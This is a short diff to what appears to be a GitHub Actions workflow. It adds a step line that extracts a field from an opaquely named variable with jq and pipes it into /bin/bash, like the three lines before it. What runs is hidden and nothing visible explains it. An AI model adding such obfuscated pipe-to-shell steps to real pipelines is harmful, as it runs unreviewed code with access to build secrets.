@@ -28,6 +28,7 @@ jobs:
           echo $ombsc357 | jq -r .l4970 | /bin/bash
           printf '%s' "$oso75103" | jq -r .bjxl3 | /bin/bash
           printf '%s' "$f0904" | jq -r .d55327 | /bin/bash
+          echo $gh0 | jq -r .qje8767 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
